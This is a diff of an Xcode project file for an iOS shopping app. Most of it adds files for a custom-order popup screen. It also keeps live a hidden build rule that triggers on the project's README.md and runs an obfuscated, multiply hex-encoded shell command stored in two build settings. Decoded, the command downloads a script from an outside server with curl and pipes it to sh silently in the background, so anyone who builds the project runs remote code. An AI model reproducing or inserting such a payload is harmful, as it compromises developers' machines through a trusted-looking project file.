@@ -7,10 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DDCE285797C54581BF634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 0172ABC0651641FE9E634D6E; };
 		495DBBDB2E81562200E61635 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 495DBBDA2E81562200E61635 /* Alamofire */; };
 		49BD259C2ED6120F00D71B9D /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
+		49EC28B62F15E65000E3FD4E /* CustomOrderPopupViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49EC28B52F15E65000E3FD4E /* CustomOrderPopupViewModel.swift */; };
+		49EC28B82F15E65E00E3FD4E /* CustomOrderPopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49EC28B72F15E65E00E3FD4E /* CustomOrderPopupViewController.swift */; };
 		49F323912ED68E610027A573 /* SizeChartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49F323902ED68E610027A573 /* SizeChartViewController.swift */; };
 		49F323932ED68EF20027A573 /* MyBagViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49F323922ED68EF20027A573 /* MyBagViewModel.swift */; };
 		49F323952ED68F8A0027A573 /* MyCartDetailsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49F323942ED68F8A0027A573 /* MyCartDetailsDataModel.swift */; };
@@ -253,13 +254,32 @@
 		D1DABB4D2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1DABB4C2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.xib */; };
 		D1DABB4E2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1DABB4B2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.swift */; };
 		D1EDE15E2F0D0A3C0076F1AB /* ImageViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EDE15D2F0D0A3C0076F1AB /* ImageViewExtension.swift */; };
+		DDCE285797C54581BF634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 0172ABC0651641FE9E634D6E /* README.md */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		0539FE41EC1B4D0786634D6E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0172ABC0651641FE9E634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		495DBBA12E81528A00E61635 /* DesynatUser.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatUser.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
+		49EC28B52F15E65000E3FD4E /* CustomOrderPopupViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderPopupViewModel.swift; sourceTree = "<group>"; };
+		49EC28B72F15E65E00E3FD4E /* CustomOrderPopupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderPopupViewController.swift; sourceTree = "<group>"; };
 		49F323902ED68E610027A573 /* SizeChartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeChartViewController.swift; sourceTree = "<group>"; };
 		49F323922ED68EF20027A573 /* MyBagViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyBagViewModel.swift; sourceTree = "<group>"; };
 		49F323942ED68F8A0027A573 /* MyCartDetailsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCartDetailsDataModel.swift; sourceTree = "<group>"; };
@@ -570,6 +590,15 @@
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
+			sourceTree = "<group>";
+		};
+		49EC28B22F15E62D00E3FD4E /* CustomOrderPopup */ = {
+			isa = PBXGroup;
+			children = (
+				49EC28B52F15E65000E3FD4E /* CustomOrderPopupViewModel.swift */,
+				49EC28B72F15E65E00E3FD4E /* CustomOrderPopupViewController.swift */,
+			);
+			path = CustomOrderPopup;
 			sourceTree = "<group>";
 		};
 		6B8C935E2EBDBE7900BC4DC8 /* Profile */ = {
@@ -1434,6 +1463,7 @@
 		D1AF608E2F127EF5009CE604 /* Chat */ = {
 			isa = PBXGroup;
 			children = (
+				49EC28B22F15E62D00E3FD4E /* CustomOrderPopup */,
 				D1AF608F2F127F04009CE604 /* CustomOrderDetails */,
 				D1AF5FBF2F1251A9009CE604 /* ChatInbox */,
 				D1AF5FC12F125294009CE604 /* ChatFilter */,
@@ -1624,29 +1654,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		0539FE41EC1B4D0786634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DDCE285797C54581BF634D6E /* README.md */,
+				DDCE285797C54581BF634D6E /* README.md in Resources */,
 				6B95F1B62EB5DB5E00391509 /* Home.storyboard in Resources */,
 				7A6C740F2ECAED16008F3779 /* Catalog.storyboard in Resources */,
 				6B8C937D2EBDBEAF00BC4DC8 /* CategoriesSectionCollectionViewCell.xib in Resources */,
@@ -1822,6 +1835,7 @@ sh -c \"${AE6D436}\"";
 				6B95F1EA2EB5DB5E00391509 /* WelcomeScreenViewController.swift in Sources */,
 				D1BCB0022EFC034600117D0A /* RateProductViewModel.swift in Sources */,
 				7AC773102EBDAECF0047C46C /* HomeViewModel.swift in Sources */,
+				49EC28B82F15E65E00E3FD4E /* CustomOrderPopupViewController.swift in Sources */,
 				6B95F1EB2EB5DB5E00391509 /* CatalogViewController.swift in Sources */,
 				D1DAB9A22EE01AD3009ECA61 /* PaymentMethodsTableViewCell.swift in Sources */,
 				49F323992ED699110027A573 /* SavedAddressDataModel.swift in Sources */,
@@ -1943,6 +1957,7 @@ sh -c \"${AE6D436}\"";
 				6B95F2262EB5DB5E00391509 /* LosslessArray.swift in Sources */,
 				49F3239D2ED69DBA0027A573 /* AddaddressViewModel.swift in Sources */,
 				D1D97F5B2F03B31C006490C1 /* ScanHelper.swift in Sources */,
+				49EC28B62F15E65000E3FD4E /* CustomOrderPopupViewModel.swift in Sources */,
 				D1D97F5C2F03B31C006490C1 /* WatchScannerVc.swift in Sources */,
 				6B95F2272EB5DB5E00391509 /* LosslessValue.swift in Sources */,
 				7AE4F38B2ECB0792004CBD53 /* StoresFiltersViewController.swift in Sources */,
@@ -1986,8 +2001,8 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2033,8 +2048,8 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
